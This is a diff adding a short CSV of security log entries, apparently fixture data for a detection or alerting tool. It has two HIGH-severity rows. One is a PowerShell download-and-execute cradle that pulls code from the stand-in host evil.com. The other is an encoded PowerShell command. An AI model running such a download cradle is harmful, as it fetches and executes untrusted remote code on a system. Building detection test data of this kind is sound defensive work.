@@ -1,0 +1,3 @@
+Time,User,Message,Severity,RiskScore
+2026-03-30 08:14:22,bob,IEX (New-Object Net.WebClient).DownloadString('http://evil.com'),HIGH,95
+2026-03-30 09:03:55,admin,powershell -encodedcommand SGVsbG8=,HIGH,95
